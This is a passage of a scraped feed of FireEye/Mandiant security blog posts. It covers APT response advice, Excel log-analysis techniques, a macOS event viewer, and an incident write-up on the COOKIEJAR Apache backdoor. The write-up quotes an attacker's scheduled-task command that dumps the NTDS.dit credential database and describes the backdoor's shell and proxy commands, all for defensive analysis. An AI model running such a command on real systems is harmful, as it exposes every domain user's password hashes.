non-privileged accounts for their day-to-day activities. This helps reduce the impact of a spear phishing email or strategic web compromise that impacts that user. To conduct administration activities, connect to a jump server using two-factor authentication. Maybe incorporate a password vault so that the vault connects the user to the jump server, after a two-factor authentication process, and the password is never divulged to the user (or present on the admin's PC). Then lock down the jump server with application whitelisting, implement enhanced logging and monitoring. Configure firewalls and systems to only accept inbound connections on administrative services from the jump servers and not from the network at large. Each of these countermeasures helps to mitigate a part of the attack lifecycle; implementing them together can help greatly strengthen the security posture.</li> \n  <li> <b>What kind of back door were the attackers using on the first infected systems?</b> <br /> That varies widely. On some cases I worked recently we've seen Gh0st RAT, we've seen Poison Ivy, we've seen a custom back door that doesn't really have a name because it's something that this one particular group uses. The particular tool there wasn't the point, just more the fact that they were infected. We're seeing a lot more use of <a target=\"_blank\" href=\"https://www.mandiant.com/blog/mtrends-3-rats-increasing-publicly-malware-targeted-attacks/\">publicly available back doors</a>. They can be pretty effective, and can also be hard to detect.</li> \n  <li> <b>How would one ever determine the true scope of a foothold in a global environment if it's using multiple command and control points?</b> <br /> To answer that question, you have to start by comprehensively surveying the environment for indicators of compromise (IOC). You start by taking the pieces of information you know, e.g. the backdoors the attacker is known to use, known compromised accounts, and command-and-control IP addresses. Perhaps this yields you two systems that are initially suspected of being compromised. You then you ask the question, \"Well, where did they go from those two systems? How did they get on those two systems?\" You conduct forensic analysis to understand all the facts related to those systems: how did they gain access, what did they do, where did they go, and what tools did they use. Then you follow those threads, identifying more systems. This can be challenging in a large environment, which is one of the really helpful use cases for<a target=\"_blank\" href=\"https://www.mandiant.com/products/mandiant-platform/intelligent-response\"> Mandiant for Intelligent Response</a>. The largest organization where I have conducted this type of incident response had around 135,000 hosts. With a team of five or six people and about eight weeks, we could get a handle on that environment.</li> \n  <li> <b>How do we balance the need to contain and respond and the need to preserve forensic evidence?</b> <br /> It depends on whether you think that it's likely to go to court or in litigation. You want to make sure that your procedures are as least intrusive as possible, but typically in most APT-type cases, we don't really worry as much about formal chain of custody for systems or preserving every system in its original state. The way I would look at it is, I would develop a set of procedures for your organization to talk about how you determine when you need to preserve and what that means and what your standard operating procedures are, so that you can explain and minimize - both explain what you're doing as well as minimize - the impact on systems.</li> \n </ol> \n</div>","descriptionType":"html","publishedDate":"Fri, 07 Jun 2013 20:16:16 +0000","feedId":1226,"bgimg":"","linkMd5":"b5371bc0b29c4dddf38e640eeb632bdb","bgimgJsdelivr":"","metaImg":"","author":"Helena Brito","publishedOrCreatedDate":1598278264208},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Excelerating Analysis, Part 2 — X[LOOKUP] Gon’ Pivot To Ya","link":"http://www.fireeye.com/blog/threat-research/2020/04/excelerating-analysis-lookup-pivot.html","description":"<p>In December 2019, we published a blog post on <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/12/tips-and-tricks-to-analyze-data-with-microsoft-excel.html\">augmenting analysis using Microsoft Excel</a> for various data sets for incident response investigations. As we described, investigations often include custom or proprietary log formats and miscellaneous, non-traditional forensic artifacts. There are, of course, a variety of ways to tackle this task, but Excel stands out as a reliable way to analyze and transform a majority of data sets we encounter.</p> \n<p>In our first post, we discussed summarizing verbose artifacts using the CONCAT function, converting timestamps using the TIME function, and using the COUNTIF function for log baselining. In this post, we will cover two additional versatile features of Excel: LOOKUP functions and PivotTables.</p> \n<p>For this scenario, we will use a dataset of logon events for an example Microsoft Office 365 (O365) instance to demonstrate how an analyst can enrich information in the dataset. Then we will demonstrate some examples of how to use PivotTables to summarize information and highlight anomalies in the data quickly.</p> \n<p>Our data contains the following columns:</p> \n<ul> \n <li>Description – Event description</li> \n <li>User – User’s name</li> \n <li>User Principle Name – email address</li> \n <li>App – such as Office 365, Sharepoint, etc.</li> \n <li>Location – Country</li> \n <li>Date</li> \n <li>IP address</li> \n <li>User agent (simplified)</li> \n <li>Organization – associated with IP address (as identified by O365)</li> \n</ul> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: O365 data set</span></p> \n<h4>LOOKUP for Data Enrichment</h4> \n<p>It may be useful to add more information to the data that could help us in analysis that isn’t provided by the original log source. A step FireEye Mandiant often performs during investigations is to take all unique IP addresses and query threat intelligence sources for each IP address for reputation, WHOIS information, connections to known threat actor activity, etc. This grants more information about each IP address that we can take into consideration in our analysis.</p> \n<p>While FireEye Mandiant is privy to historical engagement data and&nbsp;<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\">Mandiant Threat Intelligence</a>, if security teams or organizations do not have access to commercial threat intelligence feeds, there are numerous open source intelligence services that can be leveraged.</p> \n<p>We can also use IP address geolocation services to obtain latitude and longitude related to each source IP address.&nbsp;This information may be useful in identifying anomalous logons based on geographical location.</p> \n<p>After taking all source IP addresses, running them against threat intelligence feeds and geolocating them, we have the following data added to a second sheet called “IP Address Intel” in our Excel document:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 2: IP address enrichment</span></p> \n<p>We can already see before we even dive into the logs themselves that we have suspicious activity: The five IP addresses in the 203.0.113.0/24 range in our data are known to be associated with activity connected to a fictional threat actor tracked as TMP.OGRE.</p> \n<p>To enrich our original dataset, we will add three columns to our data to integrate the supplementary information: “Latitude,” “Longitude,” and “Threat Intel” (Figure 3). We can use the VLOOKUP or XLOOKUP functions to quickly retrieve the supplementary data and integrate it into our main O365 log sheet.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: Enrichment columns</span></p> \n<h4>VLOOKUP</h4> \n<p>The traditional way to look up particular data in another array is by using the <a href=\"https://support.office.com/en-us/article/vlookup-function-0bbc8083-26fe-4963-8ab8-93a18ad188a1\">VLOOKUP function</a>. We will use the following formula to reference the “Latitude” values for a given IP address:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: VLOOKUP formula for Latitude</span></p> \n<p>There are four parts to this formula:</p> \n<ol> \n <li>Value to look up:\n  <ul> \n   <li>This dictates what cell value we are going to look up more information for. In this case, it is cell G2, which is the IP address.</li> \n  </ul> </li> \n <li>Table array:\n  <ul> \n   <li>This defines the entire array in which we will look up our value and return data from. The first column in the array must contain the value being looked up. In the aforementioned example, we are searching in ‘IP Address Intel’!$A$2:$D:$15. In other words, we are looking in the other sheet in this workbook we created earlier titled “IP Address Intel”, then in that sheet, search in the cell range of A2 to D15.<br /> <br /> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture5.png\" alt=\"\" /> <span class=\"type-XS\">Figure 5: VLOOKUP table array<br /> </span> <br /> Note the use of the “$” to ensure these are absolute references and will not be updated by Excel if we copy this formula to other cells.</li> \n  </ul> </li> \n <li>Column index number:\n  <ul> \n   <li>This identifies the column number from which to return data. The first column is considered column 1. We want to return the “Latitude” value for the given IP address, so in the aforementioned example, we tell Excel to return data from column 2.</li> \n  </ul> </li> \n <li>Range lookup (match type)\n  <ul> \n   <li>This part of the formula tells Excel what type of matching to perform on the value being looked up. Excel defaults to “Approximate” matching, which assumes the data is sorted and will match the closest value. We want to perform “Exact” matching, so we put “0” here (“FALSE” is also accepted).</li> \n  </ul> </li> \n</ol> \n<p>With the VLOOKUP function complete for the “Latitude” data, we can <a href=\"https://support.office.com/en-us/article/copy-a-formula-by-dragging-the-fill-handle-in-excel-for-mac-dd928259-622b-473f-9a33-83aa1a63e218\">use the fill handle</a> to update this field for the rest of the data set.</p> \n<p>To get the values for the “Longitude” and “Threat Intel” columns, we repeat the process by using a similar function and, adjusting the column index number to reference the appropriate columns, then use the fill handle to fill in the rest of the column in our O365 data sheet:</p> \n<ul> \n <li>For Longitude:\n  <ul> \n   <li>=VLOOKUP(G2,'IP Address Intel'!$A$2:$D$15,<b>3</b>,0)</li> \n  </ul> </li> \n <li>For Threat Intel:\n  <ul> \n   <li>=VLOOKUP(G2,'IP Address Intel'!$A$2:$D$15,<b>4</b>,0)</li> \n  </ul> </li> \n</ul> \n<h4>Bonus Option: XLOOKUP</h4> \n<p>The <a href=\"https://support.office.com/en-us/article/xlookup-function-b7fd680e-6d10-43e6-84f9-88eae8bf5929\">XLOOKUP function</a> in Excel is a more efficient way to reference the threat intelligence data sheet. XLOOKUP is a newer function introduced to Excel to replace the legacy VLOOKUP function and, at the time of writing this post, is only available to “O365 subscribers in the Monthly channel”, according to Microsoft. In this instance, we will also leverage Excel’s <a href=\"https://blog-insider.office.com/2019/06/13/dynamic-arrays-and-new-functions-in-excel/\">dynamic arrays and “spilling”</a> to fill in this data more efficiently, instead of making an XLOOKUP function for each column.</p> \n<p>NOTE: To utilize dynamic arrays and spilling, the data we are seeking to enrich cannot be in the form of a “Table” object. Instead, we will apply filters to the top row of our O365 data set by selecting the “Filter” option under “Sort &amp; Filter” in the “Home” ribbon:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture6.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 6: Filter option</span></p> \n<p>To reference the threat intelligence data sheet using XLOOKUP, we will use the following formula:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture7.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 7: XLOOKUP function for enrichment</span></p> \n<p>There are three parts to this XLOOKUP formula:</p> \n<ol> \n <li>Value to lookup:\n  <ul> \n   <li>This dictates what cell value we are going to look up more information for. In this case, it is cell G2, which is the IP address.</li> \n  </ul> </li> \n <li>Array to look in:\n  <ul> \n   <li>This will be the array of data in which Excel will search for the value to look up. Excel does exact matching by default for XLOOKUP. In the aforementioned example, we are searching in ‘IP Address Intel’!$A$2:$A:$15. In other words, we are looking in the other sheet in this workbook titled “IP Address Intel”, then in that sheet, search in the cell range of A2 to A15:<br /> <br /> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture8.png\" alt=\"\" /> <span class=\"type-XS\">Figure 8: XLOOKUP array to look in<br /> </span> <br /> Note the use of the “$” to ensure these are absolute references and will not be updated by Excel if we copy this formula to other cells.</li> \n  </ul> </li> \n <li>Array of data to return:\n  <ul> \n   <li>This part will be the array of data from which Excel will return data. In this case, Excel will return the data contained within the absolute range of B2 to D15 from the “IP Address Intel” sheet for the value that was looked up. In the aforementioned example formula, it will return the values in the row for the IP address 198.51.100.126:<br /> <br /> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture9.png\" alt=\"\" /> <span class=\"type-XS\">Figure 9: Data to be returned from ‘IP Address Intel’ sheet<br /> </span> <br /> Because this is leveraging dynamic arrays and spilling, all three cells of the returned data will populate, as seen in Figure 4.</li> \n  </ul> </li> \n</ol> \n<p>Now that our dataset is completely enriched by either using VLOOKUP or XLOOKUP, we can start hunting for anomalous activity. As a quick first step, since we know at least a handful of IP addresses are potentially malicious, we can filter on the “Threat Intel” column for all rows that match “TMP.OGRE” and reveal logons with source IP addresses related to known threat actors. Now we have timeframes and suspected compromised accounts to <i>pivot</i> off of for additional hunting through other data.</p> \n<h4>PIVOT! PIVOT! PIVOT!</h4> \n<p>One of the most useful tools for highlighting anomalies by summarizing data, performing frequency analysis and quickly obtaining other statistics about a given dataset is Excel’s <a href=\"https://support.office.com/en-us/article/create-a-pivottable-to-analyze-worksheet-data-a9a84538-bfe9-40a9-a8e9-f99134456576\">PivotTable function</a>.</p> \n<h4>Location Anomalies</h4> \n<p>Let’s utilize a PivotTable to perform frequency analysis on the location from which users logged in. This type of technique may highlight activity where a user account logged in from a location which is unusual for them.</p> \n<p>To create a PivotTable for our data, we can select any cell in our O365 data and select the entire range with Ctrl+A. Then, under the “Insert” tab in the ribbon, select “PivotTable”:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture10.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 10: PivotTable selection</span></p> \n<p>This will bring up a window, as seen in Figure 11, to confirm the data for which we want to make a PivotTable (Step 1 in Figure 11). Since we selected our O365 log data set with Ctrl+A, this should be automatically populated. It will also ask where we want to put the PivotTable (Step 2 in Figure 11). In this instance, we created another sheet called “PivotTable 1” to place the PivotTable:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture11.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 11: PivotTable creation</span></p> \n<p>Now that the PivotTable is created, we must select how we want to populate the PivotTable using our data. Remember, we are trying to determine the locations from which all users logged in. We will want a row for each user and a sub-row for each location the user has logged in from. Let’s add a count of how many times they logged in from each location as well. We will use the “Date” field to do this for this example:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture12.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 12: PivotTable field definitions</span></p> \n<p>Examining this table, we can immediately see there are two users with source location anomalies: Ginger Breadman and William Brody have a small number of logons from “FarFarAway”, which is abnormal for these users based on this data set.</p> \n<p>We can add more data to this PivotTable to get a timeframe of this suspicious activity by adding two more “Date” fields to the “Values” area. Excel defaults to “Count” of whatever field we drop in this area, but we will change this to the “Minimum” and “Maximum” values by using the “Value Field Settings”, as seen in Figure 13.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture13.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 13: Adding min and max dates</span></p> \n<p>Now we have a PivotTable that shows us anomalous locations for logons, as well as the timeframe in which the logons occurred, so we can hone our investigation. For this example, we also formatted all cells with timestamp values to reflect the format FireEye Mandiant typically uses during analysis by selecting all the appropriate cells, right-clicking and choosing “Format Cells”, and using a “Custom” format of “YYYY-MM-DD HH:MM:SS”.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture14.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 14: PivotTable with suspicious locations and timeframe</span></p> \n<h4>IP Address Anomalies</h4> \n<p>Geolocation anomalies may not always be valuable. However, using a similar configuration as the previous example, we can identify suspicious source IP addresses. We will add “User Principle Name” and “IP Address” fields as Rows, and “IP Address” as Values. Let’s also add the “App” field to Columns. Our field settings and resulting table are displayed in Figure 15:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture15.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 15: PivotTable with IP addresses and apps</span></p> \n<p>With just a few clicks, we have a summarized table indicating which IP addresses each user logged in from, and which app they logged into. We can quickly identify two users logged in from IP addresses in the 203.0.113.0/24 range six times, and which applications they logged into from each of these IP addresses.</p> \n<p>While these are just a couple use cases, there are many ways to format and view evidence using PivotTables. We recommend trying PivotTables on any data set being reviewed with Excel and experimenting with the Rows, Columns, and Values parameters.</p> \n<p>We also recommend adjusting the <a href=\"https://support.office.com/en-us/article/pivottable-options-27c02eb7-27de-4b3f-9677-c48e3fe7637b\">PivotTable options</a>, which can help reformat the table itself into a format that might fit requirements.</p> \n<h4>Conclusion</h4> \n<p>These Excel functions are used frequently during investigations at FireEye Mandiant and are considered important forensic analysis techniques. The examples we give here are just a glimpse into the utility of LOOKUP functions and PivotTables. LOOKUP functions can be used to reference a multitude of data sources and can be applied in other situations during investigations such as tracking remediation and analysis efforts.</p> \n<p>PivotTables may be used in a variety of ways as well, depending on what data is available, and what sort of information is being analyzed to identify suspicious activity. Employing these techniques, alongside the ones we highlighted previously, on a consistent basis will go a long way in \"excelerating\" forensic analysis skills and efficiency.</p>","descriptionType":"html","publishedDate":"Tue, 28 Apr 2020 17:30:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture1.png","linkMd5":"32b532188c0a4e8fcaeae1dce52d4ecf","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn12@2020_4/2020/08/24/14-11-05-290_21e438accda15c6e.webp","destWidth":936,"destHeight":114,"sourceBytes":98329,"destBytes":33124,"author":"Jake Nicastro","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn12@2020_4/2020/08/24/14-11-05-290_21e438accda15c6e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn45@2020_5/2020/08/24/14-11-13-289_0c4df03d38ac4f69.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn14@2020_1/2020/08/24/14-11-13-942_af6e806bd3336b65.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn15@2020_2/2020/08/24/14-11-10-839_88d8be22b7b2298e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn16@2020_5/2020/08/24/14-11-12-989_9b231383fc1bd1cf.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn57@2020_1/2020/08/24/14-11-09-354_d7dc2cc3381c5787.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture7.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn31@2020_2/2020/08/24/14-11-10-175_d366f41f5a7985cb.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture8.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn76@2020_4/2020/08/24/14-11-10-436_ec8922d9dc24a289.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture9.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn16@2020_1/2020/08/24/14-11-10-086_601ada9ead7878b8.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture10.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn20@2020_6/2020/08/24/14-11-13-969_f113d11f92cf1d0e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture11.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn30@2020_1/2020/08/24/14-11-13-321_e99a8a2525b6d080.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture12.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn79@2020_3/2020/08/24/14-11-11-391_84e312085611e391.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture13.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn7@2020_4/2020/08/24/14-11-11-029_c301c2aae9634152.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture14.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn67@2020_2/2020/08/24/14-11-10-294_7d23ed7a9bcc285e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating2/Picture15.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn11@2020_2/2020/08/24/14-11-10-095_09777e9679495f2a.webp"},"publishedOrCreatedDate":1598278264189},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Crescendo: Real Time Event Viewer for macOS","link":"http://www.fireeye.com/blog/threat-research/2020/03/crescendo-real-time-event-viewer-for-macos.html","description":"<p>Prior to 2017, researchers couldn’t easily monitor actions performed by a process on macOS and had to resort to coding scripts that produced low level system call data. FireEye released <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2017/03/introducing_monitor.html\">Monitor.app</a> in 2017 that enabled collection of information on macOS at a higher level; at a simplified data set versus something like <a href=\"http://dtrace.org\">Dtrace</a>. I created many versions of Monitor.app over the years and have received very positive feedback from users. Recently though, users have noticed it doesn't work on macOS Catalina (10.15)...</p> \n<p>Originally, a kernel extension was required to provide the inspection capabilities offered by Monitor.app. Unfortunately, kernel extensions are running in privileged mode which has very little protection from software bugs that may lead to system instability. This means kernel extensions should only be used if absolutely necessary.&nbsp;Microsoft and Apple have started providing engineers <a href=\"https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing\">more userland alternatives</a> to accomplish what previously required writing kernel code.</p> \n<p>In Catalina, Apple released the <a href=\"https://developer.apple.com/documentation/endpointsecurity\">Endpoint Security Framework</a> (ESF) to provide a robust and (more importantly) safer way of getting access to internal operating system artifacts. Being a security guy, I’m not a huge fan when apps must ship with kernel extension to get their job done and I think this is a move in the right direction. With the coming release of 10.15.4, Apple will now pop-up a warning when a kernel extension is loaded that uses a set of these <a href=\"https://developer.apple.com/support/kernel-extensions/\">deprecated kernel programming interfaces</a> (KPIs).</p> \n<p>Now seemed like a good time to kick the tires on the Endpoint Security Framework. Also, what engineer doesn’t love to learn new languages, so why not write it all in <a href=\"https://developer.apple.com/swift/\">Swift</a> as well?</p> \n<h4>Introducing Crescendo</h4> \n<p>Crescendo is a <a href=\"https://github.com/SuprHackerSteve/Crescendo\">real time event viewer for macOS</a> that uses the ESF to show process executions and forks, file events, share mounting events, kernel extension loads, and IPC event data. ESF provides a vast amount of data, but the goal was to just pick out the things that analysts would be interested in when analyzing a piece of malware or trying to understand how a process (or component) works. Just the right amount of data without being a firehose of events to the user.</p> \n<p>Here are some of the features of Crescendo:</p> \n<ul> \n <li>System Extension using Endpoint Security Framework</li> \n <li>Real time event viewer and event detail viewer</li> \n <li>Search for easy filtering of events by process, PID, username, or event type</li> \n <li>Filters for unsigned apps vs apple signed apps</li> \n <li>Ability to export all events to JSON</li> \n <li>Context highlighting when unsigned apps are executed</li> \n</ul> \n<p>Apple has added <a href=\"https://developer.apple.com/documentation/uikit/protecting_the_user_s_privacy\">some extra security features</a> that require some extra setup for enabling Crescendo’s system extension. Head on over to the <a href=\"https://github.com/SuprHackerSteve/Crescendo/blob/master/README.md#Getting-Started\">Getting Started</a> section in the README to get started. I'm hopeful this inconvenience will be fixed in future versions.</p> \n<h4>Oh, One More Thing...<b></b></h4> \n<p>Crescendo is being released open source under the MIT license! It consists of a ready to use framework that wraps the ESF with a Swift interface, removing some of the nuances and providing a simple callback for event data. This way other developers don't have to understand all the inner details of the Endpoint Security Framework. One caveat, if you wish to use the framework in your own app, you must <a href=\"https://developer.apple.com/contact/request/system-extension/\">obtain an entitlement from Apple</a>.&nbsp;</p> \n<p>Missing a feature you’d like to see? Submit a Pull Request!</p> \n<p>Head over to the <a href=\"https://github.com/SuprHackerSteve/Crescendo\">Crescendo Github</a> to learn more and <a href=\"https://github.com/SuprHackerSteve/Crescendo/releases/download/v1.0.3/Crescendo.app.zip\">download the latest release</a>.</p>","descriptionType":"html","publishedDate":"Mon, 09 Mar 2020 16:00:00 +0000","feedId":1226,"bgimg":"","linkMd5":"19465a29beb63233e327e67700214f76","bgimgJsdelivr":"","metaImg":"","author":"Stephen Davis","publishedOrCreatedDate":1598278264187},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"COOKIEJAR: Tracking Adversaries With FireEye Endpoint Security’s Logon\nTracker Module","link":"http://www.fireeye.com/blog/threat-research/2020/08/cookiejar-tracking-adversaries-with-fireeye-endpoint-security-module.html","description":"<p>During a recent investigation at a telecommunications company led by <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html\">Mandiant Managed Defense</a>, our team was tasked with rapidly identifying systems that had been accessed by a threat actor using legitimate, but compromised domain credentials. This sometimes-challenging task was made simple because the customer had enabled the Logon Tracker module within their FireEye <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/endpoint-security.html\">Endpoint Security</a> product.</p> \n<p>Logon Tracker is an Endpoint Security Innovation Architecture module designed to simplify the investigation of lateral movement within Windows enterprise environments. Logon Tracker improves the efficiency of investigating lateral movement by aggregating historical logon activity and provides a mechanism to monitor for new activity. This data is presented in a user interface designed for analyzing investigative leads (e.g., a compromised account) and hunting for suspicious activity (e.g., RDP activity by privileged accounts). Logon Tracker also provides a graph interface that enables the identification of irregular and unique logons with the option to filter on hostnames, usernames, protocol, time of day, process name, privilege level, status (success/failure), and more.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Logon Tracker GUI interface</span></p> \n<p>A critical component of a successful incident response is the scoping effort to identify systems that may have been accessed by the adversary. Windows Event Logs offer a commonly utilized method of identifying an adversary’s lateral movement between Windows systems. However, as with all log sources, Windows Event Logs are subject to data retention limits on endpoints, making the aggregated logon activity provided by Logon Tracker a critical source of evidence for incident response.</p> \n<p>Logon Tracker’s graphical display along with the raw logon events allowed Mandiant Managed Defense to quickly identify 10 potentially compromised hosts and begin to create a timeline of adversary activity.</p> \n<p>Managed Defense also leveraged Logon Tracker to monitor for additional suspicious logons and adversary activity throughout the incident response. Searching for logons (both failed and successful) from known compromised accounts and activity originating from compromised systems allowed our investigators to quickly determine which systems should be prioritized for analysis. Additionally, Logon Tracker provides investigators the ability to:</p> \n<ul> \n <li>Filter logon data for activity originating from user-provided IP ranges</li> \n <li>Search for logon data for activity by specific privileged accounts, including “Domain Administrators” and “Enterprise Administrators”</li> \n <li>Search for any privileged logon using the “Privileged” logon type</li> \n <li>Provide alerting and definition of custom rules (coming soon!)</li> \n</ul> \n<h4>Case Background</h4> \n<p>In mid-July, the Managed Defense Security Operations Center identified potential credential harvesting activity on a Windows server. The activity included the creation of a scheduled task configured to execute the built-in Windows utility, NTDSUTIL to take a snapshot of the active NTDS.dit file and save it locally to a text file as shown in Figure 2:<u></u></p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><span class=\"code\">\"schtasks&nbsp; /s &lt;redacted&gt; /create /tn ntbackup /tr \\\"ntdsutil snapshot \\\\\\\"activate instance ntds\\\\\\\" create quit quit &gt;c:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\ntds.log\\\" /sc once /st 05:38:00 /sd 07-12-2020 /f</span></td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 2: Scheduled task creation for NTDS.DIT harvesting</span></p> \n<p>The NTDS.dit file is a database that contains Active Directory data such as user objects, group memberships, groups, and—more useful to an adversary—password hashes for all users in the domain.</p> \n<p>Leveraging Logon Tracker and simple timeline analysis, Managed Defense quickly determined an adversary had accessed this system to create a scheduled task from a system with a hostname that did not match the naming convention used within the environment. An anonymized example of Logon Tracker data is shown in Figure 3:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: Logon Tracker data</span></p> \n<p>Armed with the suspicious hostname and potentially compromised username, Managed Defense then used Logon Tracker’s search functionality to determine the scope of systems potentially accessed by the adversary.</p> \n<p>The resulting investigation revealed that an Internet-facing Customer Relationship Management (CRM) application hosted on a Linux Apache web server had been compromised. Multiple web shells had been placed within web-accessible folders, allowing an adversary to execute arbitrary commands on the server. The adversary leveraged one of these web shells to install a malicious Apache module and restart Apache for the module to take effect. Mandiant has classified this module as COOKIEJAR (see the Malware Appendix at the end of the post for more details). The COOKIEJAR module enabled the adversary to proxy through the compromised server to any arbitrary IP/port pair within the customer’s internal network, see Figure 4.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: PCAP data</span></p> \n<p>Using this proxied access to the customer’s network, the adversary leveraged previously compromised domain credentials to connect to multiple Windows servers using SMB. Due to the use of the proxy to connect into the customer’s network, the hostname of the adversary’s workstation being used to conduct the attack was also passed into the logon events. This type of activity occurs due to the direct connection to the customers network and is similar to being on the same LAN. The non-standard hostname and non-standard customer naming convention used by the adversary help make scoping an easy task. Additionally, Managed Defense was able to leverage network detection to alert on the authentication attempts and activities of the adversary’s host.</p> \n<h4>Malware Appendix</h4> \n<p>During the course of the response, Mandiant identified a customized malicious Apache plugin capable of intercepting HTTP requests to an Apache HTTP server. The new malware family COOKIEJAR was created to aid in clustering and tracking this activity. The COOKIEJAR module installs a pre-connection hook that only runs if the client IP address matches a specified hardcoded adversary-controlled IP address. It listens for SSL/TLS connections on the port specified by the Apache server, using a certificate and private key loaded from <i>/tmp/cacert.pem </i>and <i>/tmp/privkey.pem</i> respectively. If the client IP address matches the hardcoded IP address (Figure 4), the backdoor accepts three commands based on the start of the URL:</p> \n<ul> \n <li>/phpconf_t/: Simply writes &lt;html&gt;&lt;h1&gt;accepted.&lt;/h1&gt;&lt;/html&gt; as the response. Likely used to test if the server is infected with the malware.</li> \n <li>/phpconf_s/: Executes commands on the server. Any communications to and from the system are forwarded to a shell, and are AES-256-ECB encrypted and then Base58 encoded.</li> \n <li>/phpconf_p/: Decode the second encoded string provided as a hostname/port (the first is ignored), using Base58 and AES-256-ECB (same key as before). The server will connect to the remote host and act as a proxy for the command and control (C2). Data to and from the C2 is encoded using Base58 and AES-256-ECB. Data to and from the remote host is not encoded.</li> \n</ul> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture5.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 5: 